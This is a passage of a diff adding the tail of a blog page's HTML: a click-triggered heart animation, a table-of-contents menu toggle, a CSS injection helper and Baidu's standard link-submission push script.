+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
